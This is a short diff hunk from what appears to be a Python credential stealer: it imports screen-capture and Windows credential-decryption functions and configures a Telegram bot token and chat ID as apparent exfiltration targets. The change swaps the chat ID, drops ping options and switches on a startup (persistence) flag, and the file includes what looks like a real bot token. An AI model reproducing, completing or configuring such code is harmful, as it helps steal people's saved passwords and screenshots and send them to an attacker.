@@ -23,11 +23,9 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 __TOKEN__ = "7504792598:AAHN9Cy96poY_6JCKqXTBMUlx08vn8lZPNg"
-__CHAT_ID__ = "7314010265"
-__PING__ = True
-__PINGTYPE__ = "everyone"
+__CHAT_ID__ = "-4835878931"
 __ERROR__ = False
-__STARTUP__ = False
+__STARTUP__ = True
 __DEFENDER__ = False
 
 
